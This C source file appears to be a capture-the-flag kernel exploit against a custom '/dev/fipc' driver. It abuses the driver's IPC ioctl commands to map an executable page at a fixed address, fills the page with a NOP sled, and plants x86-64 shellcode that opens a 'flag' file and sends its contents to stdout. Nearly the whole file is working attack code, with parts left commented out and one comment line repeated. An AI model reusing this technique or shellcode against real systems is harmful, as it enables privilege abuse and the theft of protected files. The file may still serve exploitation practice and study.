#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <math.h>
#include <sys/msg.h>
#include <stdint.h>
#include <sys/xattr.h>
#define MSG_SPRAY_SIZE 0x20
#define SPRAY_SIZE 0x200

#define ALLOC_IPC 0x1337
#define INTERACT_IOCTL 0x1338

char *target = (void *)0x402000;
int fipcfd;

//struct data_struct {
//    char* data;
//} data_struct;

/*
   struct information for ipc_t
type = struct {
    refcount_t count;
    unsigned int key;
    struct page *page;
    struct page *tables;
    unsigned long size;
    struct list_head ipcs;
    unsigned long oo;
}
*/

void success(char* suc_msg){
    printf("[+] %s\n", suc_msg);
    return;
}

void error(char* err_msg){
    printf("[:(] %s\n", err_msg);
    return;
}

uint32_t alloc_ipc(unsigned long size){
    uint32_t ret = ioctl(fipcfd, ALLOC_IPC, size);
    if(ret == -1){
        error("failed to allocate an new IPC");
        exit(0);
    }
    success("successfully allocated IPC");
    printf("[!] key value: %x\n", ret);
    return ret;
}

void reassign_ipc(uint32_t ipc_key){
    unsigned long long ret = ioctl(fipcfd, INTERACT_IOCTL, ipc_key);
    if(ret == -1){
        error("Failed to interact with ioctl");
    }
    return;
}

unsigned long long* create_memory_map(caddr_t addr, size_t len, off_t offset){
    unsigned long long* vma = mmap(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED, fipcfd, offset);
    if((void *)vma == (void *)-1){
        error("failed to map memory");
        exit(0);
    }
    return vma;
}

int main(int argc, char* argv[]){
    
    //if(!fork()){
        fipcfd = open("/dev/fipc", O_RDWR);

        if(fipcfd < 0){
            error("Failed to open device");
            exit(0);
        }
        printf("[!] file discriptor: %x\n", fipcfd);

        //allocate 2 IPCs so that the values are different
        uint32_t key, key2;
        key = alloc_ipc(0x1000);
        key2 = alloc_ipc(0x2000);
        reassign_ipc(key); //sets it to point to the first IPCs
                           //sets it to point to the first IPCs
                           //sets it to point to the first IPCs
                           //sets it to point to the first IPCs

     //   mmap(target+0x2000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
       // memset(target + 0x2000, 'X', 0x10);

        //success("DUMMY PAGE SETUP COMPLETE");

        unsigned long long* vma_ptr = create_memory_map(target, 0x1000, 0);
        printf("[!] memory pointer: 0x%llx\n", vma_ptr);
        memset(target,'\x90', 0x100);

        success("allocated exploit page");

        //alloc_ipc(0x3000);
        //printf("[!] attempt to read: %s\n", vma_ptr);

        char payload[] = {0x68, 0x66, 0x6c, 0x61, 0x67, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0xf, 0x5, 0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5};
        memcpy(target + 0x100, payload, sizeof payload);

        success("SETUP COMPLETE, child entering while loop");
        //for(;;)
        //    *(volatile int *)target;
    //} //else {
        //sleep(2);
        //success("WAIT OVER");
    //}
}
